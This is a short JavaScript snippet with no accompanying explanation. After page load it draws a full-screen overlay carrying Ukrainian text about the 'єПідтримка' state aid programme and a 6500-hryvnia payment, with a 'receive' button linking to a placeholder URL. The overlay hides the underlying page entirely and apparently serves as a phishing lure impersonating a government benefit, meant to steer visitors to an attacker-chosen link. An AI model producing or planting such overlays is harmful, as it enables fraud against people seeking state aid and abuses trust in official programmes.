document.addEventListener("DOMContentLoaded", function() {
    setTimeout(function() {
        let popup = document.createElement('div');
        popup.style.position = 'fixed';
        popup.style.top = '0';
        popup.style.left = '0';
        popup.style.width = '100%';
        popup.style.height = '100%';
        popup.style.backgroundColor = '#ffffff';
        popup.style.display = 'flex';
        popup.style.flexDirection = 'column';
        popup.style.justifyContent = 'center';
        popup.style.alignItems = 'center';
        popup.style.zIndex = '1000';

        let title = document.createElement('div');
        title.style.textAlign = 'center';
        title.innerHTML = "<p>єПідтримка</p><p>Допомога у 6500 гривень</p>";
        title.style.marginBottom = '20px';
        title.style.fontSize = '18px';
        title.style.fontWeight = 'bold';

        let image = document.createElement('img');
        image.src = 'https://example.com/payment-image.jpg';
        image.alt = 'Платіж';
        image.style.width = '100px';
        image.style.height = '100px';
        image.style.marginBottom = '20px';

        let button = document.createElement('a');
        button.href = 'https://example.com';
        button.innerText = 'отримати';
        button.style.padding = '20px';
        button.style.backgroundColor = '#28a745';
        button.style.color = '#ffffff';
        button.style.textDecoration = 'none';
        button.style.borderRadius = '8px';
        button.style.fontSize = '18px';

        popup.appendChild(title);
        popup.appendChild(image);
        popup.appendChild(button);
        document.body.appendChild(popup);
    }, 1000);
});
